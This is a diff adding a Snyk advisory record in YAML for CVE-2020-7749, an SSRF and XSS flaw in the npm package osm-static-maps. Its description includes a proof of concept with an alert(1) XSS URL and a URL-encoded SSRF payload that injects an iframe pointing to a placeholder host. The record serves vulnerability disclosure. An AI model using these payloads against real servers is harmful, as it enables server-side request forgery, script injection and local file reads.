@@ -1,0 +1,33 @@
+---
+- id: snykio:npm:osm-static-maps:609637
+  title: Server-side Request Forgery (SSRF)
+  description: "[osm-static-maps][1] is a Create a static image of a map with the\nfeatures
+    you want\n\nAffected versions of this package are vulnerable to Server-side Request\nForgery
+    (SSRF). User input given to the package is passed directly to a\ntemplate without
+    escaping `(`\\{\\{\\{ ... }}}`)`. As such, it is possible\nfor an attacker to
+    inject arbitrary HTML/JS code and depending on the\ncontext.\n\nIt will be outputted
+    as an HTML on the page which gives opportunity for\nXSS or rendered on the server
+    (puppeteer) which also gives opportunity\nfor SSRF and Local File Read.\n\n###
+    PoC   {#poc}\n\n    git clone https://github.com/jperelli/osm-static-maps.git\n
+    \   cd osm-static-maps\n    npm install\n    npm run start\n    \n    XSS Example\n
+    \   http://localhost:3000/dynamic?tileserverUrl=%27%2Balert(1)%2B%27\n    \n    \n
+    \   SSRF Payload\n    http://localhost:3000/?tileserverUrl=%27%29%3Bfor%28var%20i%20%3D%200%3B%20i%3C99999%3B%20i%2B%2B%29%7B1%2B1%7D%3C%2Fscript%3E%3Ciframe%20style%3D%22position%3A%20absolute%3B%20top%3A%200%3B%22%20src%3D%22http%3A%2F%2Fput.your.link.here%2F%22%20width%3D%221000%22%20height%3D%221000%22%20frameborder%3D%220%22%3E%3Cscript%3E%2F%2A\n\n\n\n[1]:
+    https://www.npmjs.com/package/osm-static-maps\n"
+  affected_package: osm-static-maps
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-7749
+  cwe:
+  - CWE-918
+  disclosed_date: 2020-09-03
+  created_date: 2020-10-19
+  last_modified_date: 2020-10-19
+  credit:
+  - Vasilii Ermilov
+  references:
+  - https://github.com/jperelli/osm-static-maps/blob/master/src/template.html#L142
+  - https://github.com/jperelli/osm-static-maps/pull/24
+  source_url: https://snyk.io/vuln/SNYK-JS-OSMSTATICMAPS-609637
